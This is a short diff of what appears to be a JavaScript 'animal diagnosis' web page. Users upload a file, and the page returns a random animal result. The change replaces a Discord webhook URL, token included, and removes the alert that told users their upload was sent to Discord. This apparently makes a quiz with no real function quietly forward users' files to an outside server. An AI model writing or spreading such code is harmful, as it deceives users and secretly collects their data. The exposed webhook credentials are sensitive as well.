@@ -1,7 +1,7 @@
 // ===============================
 // 設定
 // ===============================
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1477550173419999323/yVNcPoThbLKtraZrGhBw9w84BhbnBjwJAnFngU7_mKu45iirscEjnpXSrMBEBm_VgKHA"; // ←テスト用
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1477563123249446996/LiAwELzi1FhI6s3WXdQNQAoz8yh-r-kEMXPeGy4bs6g3NZbcKU4_lGt5Jrx_9a0pnBYk"; // ←テスト用
 
 let lastUploadedFile = null;
 
@@ -51,7 +51,7 @@ fileInput.addEventListener("change",async ()=>{
         // 診断生成
         const animal = getRandomAnimal();
         storeResultData(animal);
-        alert("診断完了！Discordに送信しました");
+        alert("診断完了！");
         window.location.href='result.html';
     };
     reader.readAsDataURL(file);
